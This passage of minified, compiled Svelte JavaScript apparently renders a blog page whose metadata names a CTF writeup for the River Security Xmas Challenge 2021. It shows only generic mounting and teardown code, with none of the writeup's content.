(s,le,p),n(le,Zo),n(Zo,Rb),l(s,ik,p),l(s,ce,p),n(ce,Jo),n(Jo,Nb),l(s,rk,p),l(s,jo,p),n(jo,ic),n(ic,Wb),l(s,uk,p),l(s,ie,p),n(ie,Po),n(Po,Sb),l(s,kk,p),l(s,v,p),n(v,Mb),n(v,rc),n(rc,Ib),n(v,Ob),n(v,uc),n(uc,Fb),n(v,zb),n(v,kc),n(kc,Cb),n(v,Db),n(v,fc),n(fc,Yb),n(v,Zb),n(v,hc),n(hc,Jb),n(v,jb),n(v,dc),n(dc,Pb),n(v,Hb),l(s,fk,p),l(s,Ms,p),n(Ms,Ab),n(Ms,mc),n(mc,Xb),n(Ms,Gb),l(s,hk,p),l(s,re,p),re.innerHTML=bT,l(s,dk,p),l(s,Ho,p),n(Ho,qb),l(s,mk,p),l(s,ue,p),ue.innerHTML=gT,l(s,bk,p),l(s,Is,p),n(Is,Bb),n(Is,bc),n(bc,$b),n(Is,Qb),l(s,gk,p),l(s,Os,p),n(Os,Ao),n(Ao,gc),n(Os,Xo),n(Xo,vc),l(s,vk,p),l(s,ke,p),n(ke,_c),l(s,_k,p),l(s,fe,p),n(fe,Lb),n(fe,wc),n(wc,Kb),l(s,wk,p),l(s,he,p),n(he,Go),n(Go,s0),l(s,Ek,p),l(s,de,p),n(de,qo),n(qo,a0),l(s,Tk,p),l(s,Bo,p),n(Bo,$o),n($o,n0),n($o,bs),n(bs,e0),l(s,yk,p),l(s,me,p),n(me,Qo),n(Qo,t0),l(s,Vk,p),l(s,X,p),n(X,o0),n(X,Ec),n(Ec,p0),n(X,l0),n(X,Tc),n(Tc,c0),n(X,i0),l(s,xk,p),l(s,G,p),n(G,r0),n(G,yc),n(yc,u0),n(G,k0),n(G,Vc),n(Vc,f0),n(G,h0),l(s,Uk,p),l(s,be,p),be.innerHTML=vT,l(s,Rk,p),l(s,Fs,p),n(Fs,d0),n(Fs,xc),n(xc,m0),n(Fs,b0),l(s,Nk,p),l(s,ge,p),ge.innerHTML=_T,l(s,Wk,p),l(s,ve,p),n(ve,g0),n(ve,Uc),n(Uc,v0),l(s,Sk,p),l(s,_e,p),n(_e,Lo),n(Lo,_0),l(s,Mk,p),l(s,we,p),n(we,Ko),n(Ko,w0),l(s,Ik,p),l(s,sp,p),n(sp,ap),n(ap,E0),n(ap,gs),n(gs,T0),l(s,Ok,p),l(s,Ee,p),n(Ee,np),n(np,y0),l(s,Fk,p),l(s,_,p),n(_,V0),n(_,Rc),n(Rc,x0),n(_,U0),n(_,Nc),n(Nc,R0),n(_,N0),n(_,Wc),n(Wc,W0),n(_,S0),n(_,Sc),n(Sc,M0),n(_,I0),n(_,Mc),n(Mc,O0),n(_,F0),n(_,Ic),n(Ic,z0),n(_,C0),l(s,zk,p),l(s,ep,p),n(ep,Oc),n(Oc,D0),l(s,Ck,p),l(s,zs,p),n(zs,Y0),n(zs,vs),n(vs,Z0),n(zs,J0),l(s,Dk,p),l(s,Te,p),Te.innerHTML=wT,l(s,Yk,p),l(s,ye,p),ye.innerHTML=ET,l(s,Zk,p),l(s,tp,p),n(tp,j0),l(s,Jk,p),l(s,op,p),n(op,P0),l(s,jk,p),l(s,z,p),n(z,Ve),n(Ve,H0),n(Ve,Fc),n(Fc,A0),n(Ve,X0),n(z,G0),n(z,zc),n(zc,q0),n(z,B0),n(z,Cc),n(Cc,$0),l(s,Pk,p),l(s,q,p),n(q,Q0),n(q,Dc),n(Dc,L0),n(q,K0),n(q,Yc),n(Yc,s3),n(q,a3),l(s,Hk,p),l(s,xe,p),xe.innerHTML=TT,l(s,Ak,p),l(s,Cs,p),n(Cs,n3),n(Cs,_s),n(_s,e3),n(Cs,t3),l(s,Xk,p),l(s,Ue,p),Ue.innerHTML=yT,l(s,Gk,p),l(s,pp,p),n(pp,o3),l(s,qk,p),l(s,Re,p),Re.innerHTML=VT,l(s,Bk,p),l(s,Ne,p),Ne.innerHTML=xT,l(s,$k,p),l(s,Ds,p),n(Ds,p3),n(Ds,Zc),n(Zc,l3),n(Ds,c3),l(s,Qk,p),l(s,We,p),We.innerHTML=UT,l(s,Lk,p),l(s,lp,p),n(lp,i3),l(s,Kk,p),l(s,Se,p),Se.innerHTML=RT,l(s,sf,p),l(s,Ys,p),n(Ys,r3),n(Ys,Jc),n(Jc,u3),n(Ys,k3),l(s,af,p),l(s,Me,p),Me.innerHTML=NT,l(s,nf,p),l(s,Ie,p),n(Ie,f3),n(Ie,jc),n(jc,h3)},p:zy,d(s){s&&a(h),s&&a(D),s&&a(O),s&&a(js),s&&a(Ps),s&&a(Pc),s&&a(ws),s&&a(Hc),s&&a(As),s&&a(Ac),s&&a(De),s&&a(Xc),s&&a(Xs),s&&a(Gc),s&&a(Gs),s&&a(qc),s&&a(qs),s&&a(Bc),s&&a(Bs),s&&a($c),s&&a(Es),s&&a(Qc),s&&a($s),s&&a(Lc),s&&a(Y),s&&a(Kc),s&&a(Qs),s&&a(si),s&&a(je),s&&a(ai),s&&a(Ls),s&&a(ni),s&&a(Ks),s&&a(ei),s&&a(sa),s&&a(ti),s&&a(aa),s&&a(oi),s&&a(Ae),s&&a(pi),s&&a(na),s&&a(li),s&&a(ea),s&&a(ci),s&&a(ta),s&&a(ii),s&&a(Ts),s&&a(ri),s&&a(oa),s&&a(ui),s&&a(pa),s&&a(ki),s&&a($e),s&&a(fi),s&&a(la),s&&a(hi),s&&a(ys),s&&a(di),s&&a(ca),s&&a(mi),s&&a(ia),s&&a(bi),s&&a(ra),s&&a(gi),s&&a(ua),s&&a(vi),s&&a(at),s&&a(_i),s&&a(ka),s&&a(wi),s&&a(tt),s&&a(Ei),s&&a(fa),s&&a(Ti),s&&a(Vs),s&&a(yi),s&&a(ha),s&&a(Vi),s&&a(ot),s&&a(xi),s&&a(da),s&&a(Ui),s&&a(ma),s&&a(Ri),s&&a(ba),s&&a(Ni),s&&a(ga),s&&a(Wi),s&&a(ct),s&&a(Si),s&&a(va),s&&a(Mi),s&&a(_a),s&&a(Ii),s&&a(wa),s&&a(Oi),s&&a(Ea),s&&a(Fi),s&&a(Ta),s&&a(zi),s&&a(ft),s&&a(Ci),s&&a(ya),s&&a(Di),s&&a(mt),s&&a(Yi),s&&a(Va),s&&a(Zi),s&&a(xa),s&&a(Ji),s&&a(Ua),s&&a(ji),s&&a(Ra),s&&a(Pi),s&&a(Na),s&&a(Hi),s&&a(vt),s&&a(Ai),s&&a(Wa),s&&a(Xi),s&&a(V),s&&a(Gi),s&&a(Sa),s&&a(qi),s&&a(Ma),s&&a(Bi),s&&a(Ia),s&&a($i),s&&a(yt),s&&a(Qi),s&&a(Oa),s&&a(Li),s&&a(Fa),s&&a(Ki),s&&a(Ut),s&&a(sr),s&&a(za),s&&a(ar),s&&a(Z),s&&a(nr),s&&a(Ca),s&&a(er),s&&a(Da),s&&a(tr),s&&a(Ya),s&&a(or),s&&a(Za),s&&a(pr),s&&a(Wt),s&&a(lr),s&&a(Ja),s&&a(cr),s&&a(J),s&&a(ir),s&&a(ja),s&&a(rr),s&&a(Pa),s&&a(ur),s&&a(Ha),s&&a(kr),s&&a(Aa),s&&a(fr),s&&a(Ft),s&&a(hr),s&&a(Xa),s&&a(dr),s&&a(xs),s&&a(mr),s&&a(j),s&&a(br),s&&a(Ga),s&&a(gr),s&&a(qa),s&&a(vr),s&&a(Ba),s&&a(_r),s&&a($a),s&&a(wr),s&&a(Zt),s&&a(Er),s&&a(Qa),s&&a(Tr),s&&a(jt),s&&a(yr),s&&a(La),s&&a(Vr),s&&a(Ka),s&&a(xr),s&&a(sn),s&&a(Ur),s&&a(an),s&&a(Rr),s&&a(At),s&&a(Nr),s&&a(nn),s&&a(Wr),s&&a(Us),s&&a(Sr),s&&a(en),s&&a(Mr),s&&a(qt),s&&a(Ir),s&&a(tn),s&&a(Or),s&&a(on),s&&a(Fr),s&&a(pn),s&&a(zr),s&&a(ln),s&&a(Cr),s&&a(Qt),s&&a(Dr),s&&a(cn),s&&a(Yr),s&&a(rn),s&&a(Zr),s&&a(so),s&&a(Jr),s&&a(un),s&&a(jr),s&&a(kn),s&&a(Pr),s&&a(fn),s&&a(Hr),s&&a(hn),s&&a(Ar),s&&a(eo),s&&a(Xr),s&&a(dn),s&&a(Gr),s&&a(f),s&&a(qr),s&&a(mn),s&&a(Br),s&&a(bn),s&&a($r),s&&a(gn),s&&a(Qr),s&&a(vn),s&&a(Lr),s&&a(_n),s&&a(Kr),s&&a(co),s&&a(su),s&&a(wn),s&&a(au),s&&a(Rs),s&&a(nu),s&&a(En),s&&a(eu),s&&a(Tn),s&&a(tu),s&&a(Ns),s&&a(ou),s&&a(yn),s&&a(pu),s&&a(Ws),s&&a(lu),s&&a(Vn),s&&a(cu),s&&a(uo),s&&a(iu),s&&a(xn),s&&a(ru),s&&a(P),s&&a(uu),s&&a(Un),s&&a(ku),s&&a(N),s&&a(fu),s&&a(Rn),s&&a(hu),s&&a(ko),s&&a(du),s&&a(Nn),s&&a(mu),s&&a(Wn),s&&a(bu),s&&a(Sn),s&&a(gu),s&&a(Mn),s&&a(vu),s&&a(mo),s&&a(_u),s&&a(In),s&&a(wu),s&&a(m),s&&a(Eu),s&&a(On),s&&a(Tu),s&&a(W),s&&a(yu),s&&a(Fn),s&&a(Vu),s&&a(zn),s&&a(xu),s&&a(Cn),s&&a(Uu),s&&a(Dn),s&&a(Ru),s&&a(Yn),s&&a(Nu),s&&a(wo),s&&a(Wu),s&&a(Zn),s&&a(Su),s&&a(Ss),s&&a(Mu),s&&a(Jn),s&&a(Iu),s&&a(jn),s&&a(Ou),s&&a(Pn),s&&a(Fu),s&&a(Hn),s&&a(zu),s&&a(xo),s&&a(Cu),s&&a(An),s&&a(Du),s&&a(g),s&&a(Yu),s&&a(E),s&&a(Zu),s&&a(Xn),s&&a(Ju),s&&a(H),s&&a(ju),s&&a(Gn),s&&a(Pu),s&&a(qn),s&&a(Hu),s&&a(Bn),s&&a(Au),s&&a($n),s&&a(Xu),s&&a(So),s&&a(Gu),s&&a(Qn),s&&a(qu),s&&a(Oo),s&&a(Bu),s&&a(Ln),s&&a($u),s&&a(T),s&&a(Qu),s&&a(Kn),s&&a(Lu),s&&a(se),s&&a(Ku),s&&a(ae),s&&a(sk),s&&a(ne),s&&a(ak),s&&a(Co),s&&a(nk),s&&a(ee),s&&a(ek),s&&a(A),s&&a(tk),s&&a(te),s&&a(ok),s&&a(y),s&&a(pk),s&&a(oe),s&&a(lk),s&&a(pe),s&&a(ck),s&&a(le),s&&a(ik),s&&a(ce),s&&a(rk),s&&a(jo),s&&a(uk),s&&a(ie),s&&a(kk),s&&a(v),s&&a(fk),s&&a(Ms),s&&a(hk),s&&a(re),s&&a(dk),s&&a(Ho),s&&a(mk),s&&a(ue),s&&a(bk),s&&a(Is),s&&a(gk),s&&a(Os),s&&a(vk),s&&a(ke),s&&a(_k),s&&a(fe),s&&a(wk),s&&a(he),s&&a(Ek),s&&a(de),s&&a(Tk),s&&a(Bo),s&&a(yk),s&&a(me),s&&a(Vk),s&&a(X),s&&a(xk),s&&a(G),s&&a(Uk),s&&a(be),s&&a(Rk),s&&a(Fs),s&&a(Nk),s&&a(ge),s&&a(Wk),s&&a(ve),s&&a(Sk),s&&a(_e),s&&a(Mk),s&&a(we),s&&a(Ik),s&&a(sp),s&&a(Ok),s&&a(Ee),s&&a(Fk),s&&a(_),s&&a(zk),s&&a(ep),s&&a(Ck),s&&a(zs),s&&a(Dk),s&&a(Te),s&&a(Yk),s&&a(ye),s&&a(Zk),s&&a(tp),s&&a(Jk),s&&a(op),s&&a(jk),s&&a(z),s&&a(Pk),s&&a(q),s&&a(Hk),s&&a(xe),s&&a(Ak),s&&a(Cs),s&&a(Xk),s&&a(Ue),s&&a(Gk),s&&a(pp),s&&a(qk),s&&a(Re),s&&a(Bk),s&&a(Ne),s&&a($k),s&&a(Ds),s&&a(Qk),s&&a(We),s&&a(Lk),s&&a(lp),s&&a(Kk),s&&a(Se),s&&a(sf),s&&a(Ys),s&&a(af),s&&a(Me),s&&a(nf),s&&a(Ie)}}}function Yy(Fe){let h,C;const D=[Fe[0],I6];let O={$$slots:{default:[Dy]},$$scope:{ctx:Fe}};for(let d=0;d<D.length;d+=1)O=pg(O,D[d]);return h=new Cy({props:O}),{c(){Ny(h.$$.fragment)},l(d){Wy(h.$$.fragment,d)},m(d,F){Sy(h,d,F),C=!0},p(d,[F]){const js=F&1?My(D,[F&1&&S6(d[0]),F&0&&S6(I6)]):{};F&2&&(js.$$scope={dirty:F,ctx:d}),h.$set(js)},i(d){C||(Iy(h.$$.fragment,d),C=!0)},o(d){Oy(h.$$.fragment,d),C=!1},d(d){Fy(h,d)}}}const I6={title:"River Security Xmas Challenge (RSXC2021)",date:"2021-12-26",category:"writeup",tags:["rsxc","ctf"]};function Zy(Fe,h,C){return Fe.$$set=D=>{C(0,h=pg(pg({},h),M6(D)))},h=M6(h),[h]}class Py extends xy{constructor(h){super(),Uy(this,h,Zy,Yy,Ry,{})}}export{Py as default,I6 as metadata};
